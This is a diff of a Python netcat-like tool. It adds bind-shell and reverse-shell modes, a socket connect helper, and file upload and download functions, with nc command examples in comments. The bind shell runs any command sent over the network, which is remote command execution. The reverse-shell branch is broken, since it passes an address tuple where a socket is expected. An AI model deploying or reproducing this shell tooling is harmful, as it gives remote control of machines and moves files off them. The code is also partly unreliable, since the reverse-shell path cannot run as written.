@@ -23,9 +23,12 @@ parser.add_argument('-u', nargs='?',type=str, help='upload to file')
 parser.add_argument('-l', action='store_true', help='listen')
 parser.add_argument('-r', action='store_true', help='reverse command shell')
 parser.add_argument('-b', action='store_true', help='binding command shell')
+parser.add_argument('-d', nargs='?',type=str, help='download command shell')
+
 opt=parser.parse_args()
 
-### Listen ###
+######### Listen and Send ############
+
 def listen(ip,port):
     # Listening socket
     ip = str(ip)
@@ -39,8 +42,12 @@ def listen(ip,port):
     print(f'[*] Connecting with {raddr}')
     return s, raddr
 
+def send(ip,port):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((ip,port))
+    return client
 
-### shell, command ###
+########## shell, command #############
 def execute(cmd):
     cmd = cmd.strip()
     if not cmd:
@@ -49,26 +56,81 @@ def execute(cmd):
     result = (result.decode())
     return result
 
-### reverse_shell ###
-def send(s):
+def shell_cmd(s):
    while True:
       s.send(b"#> ")
       cmd = s.recv(1024).decode()
       result = execute(cmd)
       s.send(result.encode())
 
+############### upload_download_file #################
 
+### Act as a server ####
+## nc 127.0.0.1 6666 < out.txt
+
+def upload(s,raddr,file_name):
+    print(f'[*] Uploading file from:{raddr}')
+    buf = b''
+    while True:
+       data = s.recv(1024)
+       if data:
+          buf += data
+       else:
+          f = open(file_name,'wb')
+          f.write(buf)
+          f.close()
+          print(f'[*] Finished uploading file from:{raddr}')
+          break
+
+### Act as a client ###
+## nc -lvnp 6666 < out.txt
+
+def download(ip,port,file_name):
+    client = send(ip,port)
+    raddr = (ip,port)
+    print(f'[*] Downloading file from:{raddr}')
+    buf = b''
+    while True:
+       data = client.recv(1024)
+       if data:
+          buf += data
+       else:
+          f = open(file_name,'wb')
+          f.write(buf)
+          f.close()
+          print(f'[*] Finished Downloading file from:{raddr}')
+          break
+
+################### main ##################################
+
+## reverse shell
 if opt.r and opt.t and opt.p:
     ip = opt.t
     port = opt.p
     raddr = (ip, port)
     cmd = '/bin/bash'
-    send(raddr)
+    shell_cmd(raddr)
+## bind shell
 elif opt.b and opt.t and opt.p:
     ip = opt.t
     port = opt.p
     s, raddr = listen(ip, port)
-    send(s)
+    shell_cmd(s)
+## upload file
+elif opt.u and  opt.t and opt.p:
+    ip = opt.t
+    port = opt.p
+    s, raddr = listen(ip, port)
+    file_name = opt.u
+    upload(s,raddr,file_name)
+## download file
+elif opt.d and opt.t and opt.p:
+    ip = opt.t
+    port = opt.p
+    file_name = opt.d
+    download(ip,port,file_name)
+
+
 
 
 
